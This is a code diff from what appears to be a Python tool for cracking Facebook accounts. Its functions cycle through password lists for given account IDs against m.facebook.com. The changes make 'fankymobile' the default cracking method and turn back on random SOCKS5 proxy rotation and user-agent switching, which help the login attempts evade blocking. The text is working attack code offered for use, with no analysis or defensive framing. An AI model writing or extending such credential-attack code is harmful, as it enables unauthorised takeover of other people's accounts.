@@ -1535,7 +1535,7 @@ def metcepat():
                 elif "fankybapi" in method:
                     pool.submit(fanky_b_api,idf,pwv)
                 else:
-                    pool.submit(fanky_b_api,idf,pwv)
+                    pool.submit(fankymobile,idf,pwv)
     print("")
     Console().print(
         Panel(
@@ -1829,9 +1829,9 @@ def fankymobile(idf,pwv):
 	prog.advance(des)
 	for pw in pwv:
 		try:
-			# if 'ya' in ualuh: ua = ualu[0]
-			# nip=random.choice(prox)
-			# proxs= {'http': 'socks5://'+nip}
+			if 'ya' in ualuh: ua = ualu[0]
+			nip=random.choice(prox)
+			proxs= {'http': 'socks5://'+nip}
 			ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
 			p = ses.get("https://m.facebook.com")
 			b = BeautifulSoup(p.text, 'html.parser')
